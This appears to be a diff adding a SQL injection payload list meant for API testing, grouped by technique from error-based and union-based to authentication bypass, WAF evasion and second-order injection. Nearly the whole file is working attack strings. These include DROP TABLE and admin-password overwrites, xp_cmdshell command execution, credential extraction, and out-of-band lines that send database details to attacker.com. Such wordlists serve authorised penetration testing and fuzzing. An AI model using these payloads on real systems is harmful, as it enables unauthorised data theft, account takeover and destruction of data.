@@ -1,0 +1,137 @@
+# SQL Injection Payloads for API Testing
+# Categories: Error-based, Union-based, Time-based, Boolean-based
+
+# === BASIC PAYLOADS ===
+'
+"
+`
+')
+")
+`)
+'))
+"))
+`))
+
+# === ERROR-BASED (MySQL) ===
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,user())) USING utf8)))--
+
+# === ERROR-BASED (PostgreSQL) ===
+' AND 1=CAST((SELECT version()) AS INT)--
+'||(SELECT version())::int--
+' AND 1=1/(SELECT 0 FROM pg_sleep(5))--
+
+# === ERROR-BASED (MSSQL) ===
+' AND 1=CONVERT(INT,(SELECT @@version))--
+' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--
+
+# === ERROR-BASED (Oracle) ===
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+
+# === UNION-BASED ===
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT username,password,NULL FROM users--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables--
+0 UNION SELECT username,password FROM users--
+
+# === TIME-BASED BLIND ===
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+'; WAITFOR DELAY '0:0:5'--
+' AND pg_sleep(5)--
+' AND DBMS_LOCK.SLEEP(5)--
+' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
+' || pg_sleep(5)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND BENCHMARK(10000000,SHA1('test'))--
+
+# === BOOLEAN-BASED BLIND ===
+' AND '1'='1'--
+' AND '1'='2'--
+' AND 1=1--
+' AND 1=2--
+' OR '1'='1'--
+' OR '1'='2'--
+1' AND 1=1--
+1' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+' AND SUBSTRING(@@version,1,1)='5'--
+' AND ASCII(SUBSTRING(@@version,1,1))>50--
+
+# === AUTHENTICATION BYPASS ===
+admin'--
+admin' #
+admin'/*
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1'--
+') OR ('1'='1'/*
+' OR ''='
+' OR 1=1 LIMIT 1--
+'="or'
+' OR 'x'='x
+' AND id IS NOT NULL--
+admin' AND '1'='1
+
+# === JSON API SPECIFIC ===
+{"id": "1' OR '1'='1"}
+{"id": "1' AND '1'='1"}
+{"id": "1' UNION SELECT NULL--"}
+{"id": "1'; DROP TABLE users--"}
+{"id": {"$gt": ""}}
+{"id": "1' AND SLEEP(5)--"}
+
+# === STACKED QUERIES ===
+'; DROP TABLE users--
+'; INSERT INTO users(username,password) VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; EXEC xp_cmdshell('whoami')--
+'; SELECT * FROM users; SELECT * FROM admin--
+
+# === OUT-OF-BAND (OOB) ===
+' AND LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\'))--
+'; EXEC master..xp_dirtree '\\attacker.com\x'--
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual)--
+
+# === WAF BYPASS ===
+'/**/OR/**/1=1--
+'+OR+1=1--
+'%0aOR%0a1=1--
+'%09OR%091=1--
+'%00OR 1=1--
+' /*!50000OR*/ 1=1--
+' OR/**/ 1=1--
+'||'1
+'+'1
+'-'0
+' div 1
+' like 1
+' rlike 1
+' regexp 1
+1'<>1
+
+# === SPECIAL CHARACTERS ===
+%27
+%22
+%60
+%bf%27
+%ef%bc%87
+%c0%a7
+%e0%80%a7
+
+# === SECOND ORDER ===
+admin'--
+'; UPDATE users SET role='admin' WHERE username='attacker'--
+test'); INSERT INTO logs(log) VALUES((SELECT password FROM users WHERE username='admin'))--
